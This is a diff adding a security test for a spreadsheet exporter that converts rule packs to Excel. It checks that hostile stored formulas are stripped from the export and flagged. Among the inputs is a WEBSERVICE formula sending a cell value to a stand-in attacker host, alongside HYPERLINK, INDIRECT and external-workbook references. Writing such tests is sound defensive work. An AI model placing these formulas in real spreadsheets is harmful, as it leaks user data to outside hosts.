@@ -132,6 +132,23 @@ describe('exportRulePackToXlsx', () => {
     expect(back.tests[0].id).toBe(payloads[1])
   })
 
+  it('never re-emits a stored Excel formula outside the allow-list (security review #1)', async () => {
+    // A pack POSTed straight to the API can carry any excelFormula text.
+    const hostile = ['=WEBSERVICE("http://attacker.invalid/?d="&ingress)', '=HYPERLINK("http://x.invalid","x")', '=ingress*Sheet1!A1', "='[evil.xlsx]Sheet1'!A1", '=INDIRECT("A1")']
+    for (const excelFormula of hostile) {
+      const model: SizingModelDef = {
+        ...KAFKA_TEMPLATE_MODEL,
+        calc: KAFKA_TEMPLATE_MODEL.calc.map((c, i) => (i === 0 ? { ...c, excelFormula } : c)),
+      }
+      const exported = await exportRulePackToXlsx({ name: 'p', version: 1, models: [model] })
+      const wb = await load(exported.data)
+      const formulas: string[] = []
+      wb.getWorksheet('Calc')!.eachRow((row) => row.eachCell((cell) => { if (cell.formula) formulas.push(cell.formula) }))
+      expect(formulas.join(' '), excelFormula).not.toMatch(/WEBSERVICE|HYPERLINK|INDIRECT|!|\[/i)
+      expect(exported.issues.some((i) => /not allowed/.test(i.message.en)), excelFormula).toBe(true)
+    }
+  })
+
   it('makes a safe file name', () => {
     expect(safeFileName('Gói rule: Kafka/Prod')).toBe('Goi-rule-Kafka-Prod.xlsx')
     expect(safeFileName('<img src=x>')).toBe('img-src-x.xlsx')
